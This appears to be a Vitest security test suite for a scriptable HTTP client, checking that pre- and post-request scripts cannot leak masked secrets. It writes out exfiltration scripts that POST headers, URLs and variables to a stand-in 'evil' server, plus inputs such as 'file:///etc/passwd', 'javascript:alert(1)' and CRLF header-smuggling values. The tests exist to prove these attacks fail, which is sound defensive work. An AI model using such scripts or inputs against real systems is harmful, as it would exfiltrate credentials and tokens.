import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import {
    carriesSecret,
    KEY_LINE,
    line,
    scripts,
    startAttack,
    type Attack,
} from './support/attack-fixture.js';
import { SECRET } from './support/send-fixture.js';

let attack: Attack;

beforeEach(async () => {
    attack = await startAttack();
});

afterEach(async () => {
    await attack.stop();
});

/** Nothing of the secret reached `evil`, whatever the script handed it. */
function nothingStolen(): void {
    expect(attack.evil.hits.filter(carriesSecret)).toEqual([]);
}

/** Sends to `evil` every value the script could read, one hit per value, in order. */
function exfiltrate(values: string): string {
    return `
        const read = ${values};
        for (const [name, value] of Object.entries(read)) {
            await sendRequest({ url: '${attack.evil.url}/' + name, method: 'POST', body: String(value) });
        }
    `;
}

describe('a script that reads what the person wrote around a secret', () => {
    it('reads no secret out of a header, the url, the query, the body or a replace', async () => {
        await attack.send({
            method: 'POST',
            url: '{{baseUrl}}/echo?k={{token}}',
            headers: [KEY_LINE, line('X-Nested', '{{a}}')],
            body: { type: 'json', content: '{"k":"{{token}}"}' },
            ...scripts(
                exfiltrate(`{
                    header: request.headers.get('x-api-key'),
                    nested: request.headers.get('x-nested'),
                    url: request.url,
                    query: request.query.get('k'),
                    body: request.body,
                    replaced: vars.replaceIn('{{token}}'),
                    replacedNested: vars.replaceIn('{{a}}'),
                    nestedVar: vars.get('a'),
                }`),
            ),
        });

        expect(attack.evil.hits.map(({ url }) => url)).toEqual([
            '/header',
            '/nested',
            '/url',
            '/query',
            '/body',
            '/replaced',
            '/replacedNested',
            '/nestedVar',
        ]);
        nothingStolen();
        // The person's own send still carried the secret: what the script read was hidden from
        // it, not missing from the send.
        expect(
            attack.received.find(({ url }) => url.startsWith('/echo'))?.headers['x-api-key'],
        ).toBe(SECRET);
    });

    it('reads no secret out of the request it sent, from the script of the answer', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo?k={{token}}',
            headers: [KEY_LINE],
            ...scripts(
                undefined,
                exfiltrate(`{
                    header: request.headers.get('x-api-key'),
                    url: request.url,
                    query: request.query.get('k'),
                }`),
            ),
        });

        await vi.waitFor(() => {
            expect(attack.evil.hits).toHaveLength(3);
        });
        nothingStolen();
    });
});

describe('a server that hands the secret back outside the body', () => {
    it('hides it from a script that reads the headers of the answer', async () => {
        await attack.send({
            url: '{{baseUrl}}/reflect',
            headers: [KEY_LINE],
            ...scripts(
                undefined,
                exfiltrate(`{
                    all: JSON.stringify(response.headers),
                    one: response.headers.get('x-reflect'),
                }`),
            ),
        });

        await vi.waitFor(() => {
            expect(attack.evil.hits).toHaveLength(2);
        });
        nothingStolen();
    });
});

describe('a script that sends on its own with what the person keeps', () => {
    it('sends no secret to the origin of the person through sendRequest', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            ...scripts(`
                await sendRequest({
                    url: vars.get('baseUrl') + '/own?k={{token}}',
                    method: 'POST',
                    headers: { 'X-Api-Key': '{{token}}', 'X-Nested': '{{a}}' },
                    body: '{{token}} {{a}}',
                });
            `),
        });

        const own = attack.received.filter(({ url }) => !url.startsWith('/echo'));

        // The send of the script did reach the origin: what it lacks is the secret, not the trip.
        expect(own).toHaveLength(1);
        expect(own[0]?.headers['x-api-key']).toBe('{{token}}');
        expect(attack.received.filter(carriesSecret)).toEqual([]);
    });
});

describe('a script that points the send where no http goes', () => {
    const SCHEMES = [
        'file:///etc/passwd',
        'data:text/plain,hello',
        'ftp://127.0.0.1/x',
        'javascript:alert(1)',
    ];

    it.each(SCHEMES)('refuses %s through sendRequest, and the send goes on', async (url) => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            ...scripts(`
                let said = 'answered';
                try { await sendRequest({ url: '${url}' }); } catch (error) { said = 'refused'; }
                request.headers.set('X-Said', said);
            `),
        });

        expect(attack.received.map(({ headers }) => headers['x-said'])).toEqual(['refused']);
        expect(attack.evil.hits).toEqual([]);
    });

    it.each(SCHEMES)('refuses %s as the url of the send', async (url) => {
        const moved = await attack.send({
            url: '{{baseUrl}}/echo',
            headers: [KEY_LINE],
            ...scripts(`request.url = '${url}';`),
        });

        expect(moved.ok).toBe(false);
        expect(attack.received).toEqual([]);
        expect(attack.evil.hits).toEqual([]);
    });

    it('sends no header a script broke into two lines', async () => {
        const answer = await attack.send({
            url: '{{baseUrl}}/echo',
            ...scripts(`
                request.headers.set('X-A', 'v\\r\\nX-Injected: 1');
                request.headers.set('X-B\\r\\nX-Smuggled', '1');
            `),
        });

        // Either the send refuses the line or it travels folded into one value: never two.
        expect(attack.received).toHaveLength(answer.ok ? 1 : 0);
        expect(attack.received.map(({ headers }) => headers['x-injected'])).not.toContain('1');
        expect(attack.received.map(({ headers }) => headers['x-smuggled'])).not.toContain('1');
    });
});
